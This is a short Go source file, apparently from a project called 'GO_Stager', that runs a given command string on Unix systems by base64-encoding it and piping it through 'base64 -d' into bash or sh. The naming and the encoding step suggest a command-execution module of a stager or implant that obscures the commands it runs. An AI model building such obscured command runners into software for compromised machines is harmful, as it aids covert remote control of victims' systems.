//go:build !windows
// +build !windows

package Command

import (
	"encoding/base64"
	"os"
	"os/exec"

	"GO_Stager/util"
)

func cross_platform_exec(command string) (string, error) {
	sh_path := "/bin/bash"
	_, err := os.Stat(sh_path)
	if err != nil {
		sh_path = "/bin/sh"
	}

	cmdstr, _ := util.Strim(command)
	base64Cmd := base64.StdEncoding.EncodeToString([]byte(cmdstr))
	final_cmd := util.Sprintf("echo %s | timeout 4 base64 -d | timeout %d %s", base64Cmd, 4, sh_path)
	util.Println(final_cmd)
	cmd := exec.Command(sh_path, "-c", final_cmd)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), err
	}
	return string(Auto_decode_string_on_windows(output)), err
}

func Auto_decode_string_on_windows(input []byte) (output []byte) { return input }
